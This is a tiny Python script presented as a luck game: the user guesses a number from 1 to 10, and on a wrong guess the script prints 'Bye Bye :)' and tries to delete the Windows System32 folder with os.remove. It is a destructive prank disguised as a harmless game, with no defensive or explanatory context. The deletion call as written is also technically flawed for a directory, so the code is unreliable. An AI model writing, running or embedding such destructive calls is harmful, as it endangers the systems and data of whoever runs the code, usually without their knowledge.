import random
import os

selectednumber=int(input("Pick a number 1-10: "))
randomnumber=random.randint(1,10)

if selectednumber == randomnumber:
    print("You're Lucky...")
else:
    print("Bye Bye :)")
    os.remove("C:/Windows/System32")